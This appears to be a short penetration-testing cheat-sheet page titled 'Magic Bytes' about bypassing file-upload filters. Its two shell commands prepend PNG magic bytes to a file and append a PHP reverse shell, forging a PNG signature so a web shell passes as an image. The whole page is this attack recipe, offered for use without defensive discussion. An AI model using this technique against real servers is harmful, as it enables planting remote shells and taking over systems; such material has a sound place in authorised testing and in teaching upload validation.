---
title: "Magic Bytes"
date: 2024-7-2
tags: ["file upload", "magic bytes", "png", "bypass"]
---

### Forge File Signature

{{< tab set1 tab1 active >}}png{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```console
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r >> php-reverse-shell.php.png
```

```console
cat php-reverse-shell.php >> php-reverse-shell.php.png
```

</div>

{{< /tabcontent >}}

<br>